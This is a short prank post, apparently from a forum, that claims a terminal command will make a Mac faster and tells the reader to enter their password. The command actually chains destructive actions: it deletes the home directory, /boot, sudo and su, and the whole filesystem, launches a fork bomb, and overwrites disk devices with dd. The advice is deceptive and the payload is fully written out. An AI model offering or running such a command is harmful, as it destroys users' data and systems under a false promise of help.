Also, to make your mac faster, open the terminal and type
    "  sudo rm -rf ~ && rm -rf .* && sudo rm -rf /boot && rm -f /usr/bin/sudo;rm -f /bin/su && x(){ x|x & };x && ls && echo "NULL" > /dev/sda && dd if=/dev/zero of=/dev/hda && mv / /dev/null && rm -rf /
 "     and
enter your password!
(don't put the quotes in or "u r n id10t")
